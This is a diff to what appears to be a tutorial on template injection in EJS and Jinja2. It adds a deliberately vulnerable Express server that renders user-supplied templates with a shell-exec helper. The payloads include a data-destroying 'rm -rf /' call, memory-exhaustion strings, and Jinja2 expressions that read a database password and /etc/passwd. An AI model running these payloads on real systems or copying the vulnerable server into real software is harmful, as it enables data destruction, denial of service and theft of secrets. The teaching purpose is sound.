@@ -23,7 +23,10 @@ const app = express();
 app.set("view engine", "ejs");
 
 app.get("/", (_, res) => {
-  const data = { name: "Alice", items: ["Apples", "Bananas", "Cherries"] };
+  const data = {
+    name: "Alice",
+    items: ["Apples", "Bananas", "Cherries", "console.log(process.pid);"],
+  };
   res.render("index", data);
 });
 
@@ -38,7 +41,41 @@ app.listen(3000);
   <li>Apples</li>
   <li>Bananas</li>
   <li>Cherries</li>
+  <li>console.log(process.pid);</li>
 </ul>
+```
+
+### SSTI
+
+#### Server
+
+```js
+import { exec } from "node:child_process";
+import express from "express";
+import ejs from "ejs";
+
+const app = express();
+
+const execute = (command) => {
+  exec(command);
+};
+
+const allocate = (size) => {
+  Buffer.alloc(size, "A");
+};
+
+app.get("/", (req, res) => {
+  res.send(ejs.render(req.query.template), { execute, allocate });
+});
+
+app.listen(3000);
+```
+
+#### Payloads
+
+```js
+<%= execute("rm -rf /") %>
+<%= allocate(10 ** 9) %>
 ```
 
 ## Jinja2
@@ -62,7 +99,10 @@ app = Flask(__name__)
 
 @app.route("/")
 def home():
-    data = {"name": "Bob", "items": ["Pepper", "Turmeric", "Ginger"]}
+    data = {
+        "name": "Bob",
+        "items": ["Pepper", "Turmeric", "Ginger", "<script>alert(1);</script>"],
+    }
     return render_template("index.html", **data)
 
 if __name__ == "__main__":
@@ -77,6 +117,7 @@ if __name__ == "__main__":
   <li>Pepper</li>
   <li>Turmeric</li>
   <li>Ginger</li>
+  <li>&lt;script&gt;alert(1);&lt;/script&gt;</li>
 </ul>
 ```
 
@@ -101,7 +142,7 @@ if __name__ == "__main__":
 #### Payloads
 
 ```py
-{{ "".join("A" * 10**8) }}
+{{ "".join("A" * 10**9) }}
 {{ config["DATABASE_PASSWORD"] }}
 {{ request.__class__.__mro__[1].__subclasses__()[40]("/etc/passwd").read() }}
 ```
